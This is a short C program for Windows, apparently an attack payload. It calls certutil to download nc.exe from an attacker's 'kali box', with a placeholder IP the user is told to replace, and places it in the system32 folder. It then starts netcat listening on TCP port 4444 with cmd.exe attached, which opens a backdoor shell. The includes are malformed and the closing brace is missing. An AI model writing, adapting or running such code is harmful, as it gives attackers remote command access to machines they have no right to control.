#include <stdlib.h
#include <windows.h

int main ()
{

    int i;
         /*Using the native “certuil.exe”, download nc.exe.txt from the kali
         box and save it as C:\windows\system32\nc.exe */
    i = system ("certutil -urlcache -split -f http://0.0.0.0/nc.exe.txt c:\\windows\\system32\\nc.exe");//use your IP adress
    Sleep(10000); // 10 seconds (10000 milliseconds)
    i = system ("nc.exe -nlvp 4444 -e cmd.exe"); //Create a listening socket on TCP 4444 (Windows Machine)


            return 0;
